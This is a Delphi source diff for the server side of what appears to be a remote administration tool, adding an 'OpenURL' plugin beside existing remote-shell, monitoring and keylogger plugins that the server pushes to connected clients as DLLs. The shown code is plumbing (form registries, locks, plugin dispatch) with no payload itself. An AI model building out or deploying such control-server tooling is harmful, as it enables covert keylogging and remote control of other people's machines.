@@ -12,7 +12,8 @@ uses
   UnitProcessManager,
   UnitRemoteShell,
   UnitRemoteMonitoring,
-  UnitKeylogger;
+  UnitKeylogger,
+  UnitOpenURL;
 
 const
   INFORMATION_PLUGIN_ID       = 'InformationPlugin';
@@ -20,6 +21,7 @@ const
   REMOTE_SHELL_PLUGIN_ID      = 'RemoteShellPlugin';
   REMOTE_MONITORING_PLUGIN_ID = 'RemoteMonitoringPlugin';
   KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
+  OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   MAX_JSON_BUFFER_SIZE        = 16 * 1024 * 1024;
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
@@ -79,6 +81,7 @@ type
     FRemoteShellForms : TDictionary<TncLine, TForm5>;
     FMonitoringForms  : TDictionary<TncLine, TForm6>;
     FKeyloggerForms   : TDictionary<TncLine, TForm7>;
+    FOpenURLForms     : TDictionary<TncLine, TForm8>;
     FReadBuffers      : TDictionary<TncLine, TBytes>;
     FHeartbeatTimer   : TTimer;
     FIsStopping       : Boolean;
@@ -108,6 +111,7 @@ type
     procedure DetachRemoteShellForms;
     procedure DetachMonitoringForms;
     procedure DetachKeyloggerForms;
+    procedure DetachOpenURLForms;
 
   public
     constructor Create(aServer: TncTCPServer);
@@ -122,6 +126,7 @@ type
     procedure SendRemoteShellPlugin(aLine: TncLine);
     procedure SendRemoteMonitoringPlugin(aLine: TncLine);
     procedure SendKeyloggerPlugin(aLine: TncLine);
+    procedure SendOpenURLPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -146,6 +151,10 @@ type
     procedure RegisterKeyloggerForm  (aLine: TncLine; AForm: TForm7);
     procedure UnregisterKeyloggerForm(aLine: TncLine);
     function  GetKeyloggerForm       (aLine: TncLine): TForm7;
+
+    procedure RegisterOpenURLForm  (aLine: TncLine; AForm: TForm8);
+    procedure UnregisterOpenURLForm(aLine: TncLine);
+    function  GetOpenURLForm       (aLine: TncLine): TForm8;
 
     property OnClientConnected    : TClientEvent              read FOnClientConnected     write FOnClientConnected;
     property OnClientUpdated      : TClientEvent              read FOnClientUpdated       write FOnClientUpdated;
@@ -204,6 +213,7 @@ begin
   FRemoteShellForms := TDictionary<TncLine, TForm5>.Create;
   FMonitoringForms  := TDictionary<TncLine, TForm6>.Create;
   FKeyloggerForms   := TDictionary<TncLine, TForm7>.Create;
+  FOpenURLForms     := TDictionary<TncLine, TForm8>.Create;
   FReadBuffers      := TDictionary<TncLine, TBytes>.Create;
 
   FServer.OnConnected    := OnConnected;
@@ -225,7 +235,9 @@ begin
   DetachRemoteShellForms;
   DetachMonitoringForms;
   DetachKeyloggerForms;
+  DetachOpenURLForms;
   FReadBuffers.Free;
+  FOpenURLForms.Free;
   FKeyloggerForms.Free;
   FMonitoringForms.Free;
   FRemoteShellForms.Free;
@@ -264,6 +276,12 @@ begin
   FOnMonitoringReceived := nil;
   FOnKeyloggerReceived  := nil;
   FOnLog                := nil;
+
+  DetachProcessForms;
+  DetachRemoteShellForms;
+  DetachMonitoringForms;
+  DetachKeyloggerForms;
+  DetachOpenURLForms;
 
   if FServer.Active then
     FServer.Active := False;
@@ -466,6 +484,37 @@ begin
   end;
 end;
 
+procedure TServerManager.RegisterOpenURLForm(aLine: TncLine; AForm: TForm8);
+begin
+  FLock.Enter;
+  try
+    FOpenURLForms.AddOrSetValue(aLine, AForm);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.UnregisterOpenURLForm(aLine: TncLine);
+begin
+  FLock.Enter;
+  try
+    FOpenURLForms.Remove(aLine);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+function TServerManager.GetOpenURLForm(aLine: TncLine): TForm8;
+begin
+  FLock.Enter;
+  try
+    if not FOpenURLForms.TryGetValue(aLine, Result) then
+      Result := nil;
+  finally
+    FLock.Leave;
+  end;
+end;
+
 procedure TServerManager.DetachProcessForms;
 var
   AForm: TForm4;
@@ -476,6 +525,16 @@ begin
       if Assigned(AForm) then
         AForm.DetachCallbacks;
     FProcessForms.Clear;
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.DetachOpenURLForms;
+begin
+  FLock.Enter;
+  try
+    FOpenURLForms.Clear;
   finally
     FLock.Leave;
   end;
@@ -710,6 +769,11 @@ begin
   SendPlugin(aLine, KEYLOGGER_PLUGIN_ID);
 end;
 
+procedure TServerManager.SendOpenURLPlugin(aLine: TncLine);
+begin
+  SendPlugin(aLine, OPEN_URL_PLUGIN_ID);
+end;
+
 { --- Server Olaylari --- }
 
 procedure TServerManager.OnConnected(Sender: TObject; aLine: TncLine);
@@ -775,6 +839,7 @@ begin
     if FKeyloggerForms.TryGetValue(aLine, KeyloggerForm) and Assigned(KeyloggerForm) then
       KeyloggerForm.DetachCallbacks;
     FKeyloggerForms.Remove(aLine);
+    FOpenURLForms.Remove(aLine);
   finally
     FLock.Leave;
   end;
@@ -983,6 +1048,8 @@ begin
           SendRemoteMonitoringPlugin(aLine)
         else if SameText(PluginID, KEYLOGGER_PLUGIN_ID) then
           SendKeyloggerPlugin(aLine)
+        else if SameText(PluginID, OPEN_URL_PLUGIN_ID) then
+          SendOpenURLPlugin(aLine)
         else
           SendPlugin(aLine, PluginID);
       end;
